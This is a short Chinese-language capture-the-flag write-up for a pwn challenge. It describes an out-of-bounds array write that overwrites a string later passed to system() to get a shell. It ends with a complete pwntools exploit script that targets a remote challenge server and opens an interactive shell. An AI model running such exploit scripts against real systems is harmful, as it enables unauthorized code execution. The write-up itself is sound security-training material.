pwn

这个pwn 就是思路清奇了。伪代码没看懂想干啥，然后一直malloc就除了shell。。。,,,然后第一次看是觉得数组越界，以为是整形溢出，结果没想到洞出的那么明显。。。

这样一个利用链吧，64*64=4096，所以后面那个梳子深入100就造成了越界写，写通过这个越界写，看到后面的字符串，后面那个串会被system调用，我们只需呀越界写成’/bin/sh’就拿到了shell。

然后gdb调试可以看到其原来存储的字符串，最后通过第一个参数控制对其相加减，为sh，最后拿到shell。

from pwn import *

p=remote('10.130.89.53',10000)

#####
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
sym     = lambda symbol             :pdbg.sym(symbol)

#-----------------------------------------------------------------------------------------
sla('How many points?',0xc+0x106+0x8b-12 )

ru('Input the points:\n')
for i in range(0xc):
    sl('1 100')
for i in range(0x106-12):
    sl('2 100')
for i in range(0x8b):
    sl('4 100')

it()
